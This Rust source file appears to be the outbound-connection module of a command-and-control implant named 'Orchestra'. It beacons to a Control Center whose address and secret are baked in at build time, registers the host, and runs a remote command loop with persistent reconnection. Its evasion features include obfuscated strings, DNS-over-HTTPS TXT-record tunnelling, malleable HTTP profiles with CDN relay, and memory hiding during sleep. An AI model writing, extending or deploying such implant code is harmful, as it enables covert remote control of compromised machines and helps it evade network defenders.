//! Outbound connection mode — compiled only when `outbound-c` feature is active.
//!
//! The agent dials the Orchestra Control Center (instead of waiting for an
//! inbound connection from a console) and maintains a persistent session with
//! exponential-backoff reconnection.
//!
//! # Address resolution
//!
//! Release builds use `ORCHESTRA_C_ADDR` baked into the binary at compile time
//! via the Builder's `cargo build … ORCHESTRA_C_ADDR=<addr>` invocation. Debug
//! builds may override it with the `ORCHESTRA_C` runtime environment variable
//! to simplify local testing.
//!
//! # Secret resolution
//!
//! Release builds use `ORCHESTRA_C_SECRET` baked in at compile time. Debug
//! builds may override it with the `ORCHESTRA_SECRET` runtime environment
//! variable for local testing.
//!
//! # TLS verification
//!
//! When `ORCHESTRA_C_CERT_FP` is baked in at build time the agent pins the
//! server certificate by its SHA-256 fingerprint (hex).  Without a fingerprint
//! the agent uses the system's native root CA store, which works for servers
//! with publicly-trusted certificates.  Production deployments should always
//! use certificate pinning.

use anyhow::{anyhow, Result};
use common::tls_transport::{PinnedCertVerifier, TlsTransport};
use common::{CryptoSession, Message, Transport};
use log::{error, info, warn};
use rustls::ClientConfig;
use std::sync::Arc;
use sysinfo::System;
use tokio::net::TcpStream;
use tokio::time::{sleep, Duration};
use tokio_rustls::TlsConnector;
use uuid::Uuid;

// Compile-time constants injected by the Builder (may be absent in manual builds).
const BAKED_ADDR: Option<&str> = option_env!("ORCHESTRA_C_ADDR");
const BAKED_SECRET: Option<&str> = option_env!("ORCHESTRA_C_SECRET");
const BAKED_CERT_FP: Option<&str> = option_env!("ORCHESTRA_C_CERT_FP");

const MAX_BACKOFF_SECS: u64 = 64;

/// Resolve the server address: runtime env var beats compile-time constant.
pub fn resolve_addr() -> Option<String> {
    #[cfg(debug_assertions)]
    {
        let raw = string_crypt::enc_str!("ORCHESTRA_C");
        let key = std::str::from_utf8(&raw)
            .unwrap_or("")
            .trim_end_matches('\0');
        if let Ok(v) = std::env::var(key) {
            return Some(v);
        }
    }
    BAKED_ADDR.map(str::to_string)
}

/// Resolve the pre-shared secret: runtime env var beats compile-time constant.
pub fn resolve_secret() -> Option<String> {
    #[cfg(debug_assertions)]
    {
        let raw = string_crypt::enc_str!("ORCHESTRA_SECRET");
        let key = std::str::from_utf8(&raw)
            .unwrap_or("")
            .trim_end_matches('\0');
        if let Ok(v) = std::env::var(key) {
            return Some(v);
        }
    }
    BAKED_SECRET.map(str::to_string)
}

/// Resolve the TLS certificate fingerprint (hex SHA-256).
pub fn resolve_cert_fp() -> Option<String> {
    BAKED_CERT_FP.map(str::to_string)
}

/// Build a rustls `ClientConfig` for connecting to the Control Center.
///
/// When `cert_fp` is provided the server certificate is verified by its
/// SHA-256 fingerprint (strict pinning).  Otherwise the system's native root
/// CA store is used.
fn build_tls_client_config(cert_fp: Option<&str>) -> Result<ClientConfig> {
    if let Some(fp) = cert_fp {
        let verifier = PinnedCertVerifier::from_hex(fp)?;
        let cfg = ClientConfig::builder()
            .dangerous()
            .with_custom_certificate_verifier(Arc::new(verifier))
            .with_no_client_auth();
        return Ok(cfg);
    }

    // No fingerprint — fall back to native root store.
    let mut roots = rustls::RootCertStore::empty();
    let native = rustls_native_certs::load_native_certs();
    if !native.errors.is_empty() {
        warn!(
            "outbound-c: {} errors loading native root certs (continuing)",
            native.errors.len()
        );
    }
    for cert in native.certs {
        roots.add(cert).ok();
    }
    Ok(ClientConfig::builder()
        .with_root_certificates(roots)
        .with_no_client_auth())
}

/// Send the initial heartbeat and start the agent command loop for any transport.
async fn run_with_heartbeat(
    mut transport: Box<dyn Transport + Send>,
    agent_id: &str,
) -> Result<()> {
    let hostname = System::host_name().unwrap_or_else(|| "unknown".to_string());
    transport
        .send(Message::Heartbeat {
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_secs())
                .unwrap_or(0),
            agent_id: agent_id.to_string(),
            status: hostname,
        })
        .await?;
    info!("outbound-c: registered with Control Center, running command loop");
    let mut agent = crate::Agent::new(transport)?;
    agent.run().await
}

/// Connect once, run the agent command loop until transport error or
/// clean shutdown. Returns `Ok(())` on a clean `Shutdown` command.
async fn connect_once(
    addr: &str,
    secret: &str,
    agent_id: &str,
    cert_fp: Option<&str>,
) -> Result<()> {
    // ─── Experimental transport selection ────────────────────────────────────
    // When a covert transport feature is compiled in AND the malleable profile
    // requests it, use that transport instead of establishing a TLS connection.
    // The malleable profile is read from the config file loaded at runtime;
    // errors fall through to the default TLS transport.
    #[cfg(any(feature = "doh-transport", feature = "http-transport"))]
    {
        match crate::config::load_config() {
            Ok(cfg) => {
                // doh-transport: tunnel C2 messages through DNS TXT records sent
                // to a public DoH resolver.  Requires a server-side DoH-to-C2
                // bridge; the bridge URL must be set in `doh_server_url` in the
                // malleable profile — activating without it would produce a
                // transport that can never receive commands.
                #[cfg(feature = "doh-transport")]
                if cfg.malleable_profile.dns_over_https {
                    let server_url = cfg
                        .malleable_profile
                        .doh_server_url
                        .as_deref()
                        .filter(|s| !s.is_empty())
                        .ok_or_else(|| anyhow!(
                            "DoH transport requires a compatible server-side DNS-to-C2 bridge \
                             which is not included. Set doh_server_url in config or disable \
                             dns_over_https."
                        ))?;
                    info!(
                        "doh-transport: dns_over_https=true, server_url={}; switching to DohTransport",
                        server_url
                    );
                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
                    let transport: Box<dyn Transport + Send> = Box::new(
                        crate::c2_doh::DohTransport::new(&cfg.malleable_profile, session)
                            .await
                            .map_err(|e| anyhow!("DohTransport init failed: {e}"))?,
                    );
                    return run_with_heartbeat(transport, agent_id).await;
                }

                // http-transport: tunnel C2 messages over HTTP/S using the
                // malleable profile (custom User-Agent, Host header, staging URI).
                // The Orchestra server must expose the staging URI via its reverse
                // proxy — see docs/C_SERVER.md.
                #[cfg(feature = "http-transport")]
                if cfg.malleable_profile.cdn_relay {
                    info!("http-transport: cdn_relay=true; switching to HttpTransport");
                    let session = CryptoSession::from_shared_secret(secret.as_bytes());
                    let transport: Box<dyn Transport + Send> = Box::new(
                        crate::c2_http::HttpTransport::new(&cfg.malleable_profile, session)
                            .await
                            .map_err(|e| anyhow!("HttpTransport init failed: {e}"))?,
                    );
                    return run_with_heartbeat(transport, agent_id).await;
                }
            }
            Err(e) => {
                warn!(
                    "outbound-c: could not load config for transport selection: {e}; \
                     falling back to TLS transport"
                );
            }
        }
    }

    // ─── Default: direct TLS connection to Control Center ────────────────────
    info!("outbound-c: connecting to Control Center addr={addr} agent_id={agent_id}");

    let tcp = TcpStream::connect(addr).await?;
    tcp.set_nodelay(true)?;

    // Establish a real TLS connection to the Control Center.
    let tls_cfg = build_tls_client_config(cert_fp)?;
    let connector = TlsConnector::from(Arc::new(tls_cfg));

    // Extract hostname from addr (host:port) for TLS SNI.
    let host = addr.split(':').next().unwrap_or(addr);
    let server_name = rustls::pki_types::ServerName::try_from(host.to_owned())
        .map_err(|e| anyhow!("invalid server address for TLS SNI '{host}': {e}"))?;

    let mut tls_stream = connector.connect(server_name, tcp).await?;
    info!("outbound-c: TLS handshake complete");

    // When forward-secrecy is enabled, derive a per-session key via X25519 ECDH.
    #[cfg(feature = "forward-secrecy")]
    let session = common::forward_secrecy::negotiate_session_key(
        &mut tls_stream,
        secret.as_bytes(),
        true, // client sends its public key first
    )
    .await?;
    #[cfg(not(feature = "forward-secrecy"))]
    let session = CryptoSession::from_shared_secret(secret.as_bytes());

    let transport: Box<dyn Transport + Send> = Box::new(TlsTransport::new(tls_stream, session));

    run_with_heartbeat(transport, agent_id).await
}

/// Reconnect loop with exponential back-off. Returns only on clean shutdown
/// (i.e. when the agent receives `Command::Shutdown` from the server).
pub async fn run_forever() -> Result<()> {
    let addr = resolve_addr().ok_or_else(|| {
        anyhow!(
            "No Control Center address configured. \
             Rebuild with ORCHESTRA_C_ADDR set (the Builder does this automatically). \
             Debug builds may also set ORCHESTRA_C at runtime."
        )
    })?;

    let secret = resolve_secret().ok_or_else(|| {
        anyhow!(
            "No pre-shared secret configured. \
             Rebuild with ORCHESTRA_C_SECRET set. \
             Debug builds may also set ORCHESTRA_SECRET at runtime."
        )
    })?;

    let cert_fp = resolve_cert_fp();
    if cert_fp.is_none() {
        warn!(
            "outbound-c: no TLS certificate fingerprint configured. \
             Production deployments should bake in ORCHESTRA_C_CERT_FP for strict pinning."
        );
    }

    // Generate a stable agent ID for this process lifetime so the server
    // recognises reconnects as the same agent.
    let agent_id = format!(
        "{}-{}",
        System::host_name().unwrap_or_else(|| "agent".to_string()),
        Uuid::new_v4()
    );

    let mut backoff = Duration::from_secs(1);
    loop {
        match connect_once(&addr, &secret, &agent_id, cert_fp.as_deref()).await {
            Ok(()) => {
                // Clean shutdown — respect it, do not reconnect.
                info!("outbound-c: received Shutdown from Control Center, exiting.");
                return Ok(());
            }
            Err(e) => {
                error!("outbound-c: session ended: {e:#}");
                warn!("outbound-c: reconnecting in {backoff:?}");
                // Protect sensitive memory while waiting to reconnect.
                if let Err(ge) = crate::memory_guard::guarded_sleep(backoff, None).await {
                    error!("[memory-guard] error during reconnect backoff: {ge}");
                    sleep(backoff).await;
                }
                backoff = (backoff * 2).min(Duration::from_secs(MAX_BACKOFF_SECS));
            }
        }
    }
}
